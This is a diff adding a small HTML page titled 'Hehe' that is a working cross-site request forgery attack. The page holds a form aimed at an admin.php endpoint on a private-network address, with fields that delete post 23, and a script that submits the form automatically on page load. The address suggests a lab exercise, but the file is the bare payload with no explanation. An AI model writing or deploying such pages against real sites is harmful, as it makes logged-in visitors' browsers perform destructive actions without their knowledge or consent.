@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hehe</title>
+</head>
+<style>
+    button {
+        align-items: center;
+    }
+</style>
+<body>
+    <form id="csrfForm" action="http://192.168.39.2/admin.php" method="POST">
+        <input type="number" name="post_id" value="23">
+        <input type="hidden" name="delete_post" value="Delete Post">
+    </form>
+
+</body>
+<script>
+    window.addEventListener('load', function (){
+        document.getElementById('csrfForm').submit();
+    });
+</script>
+</html>
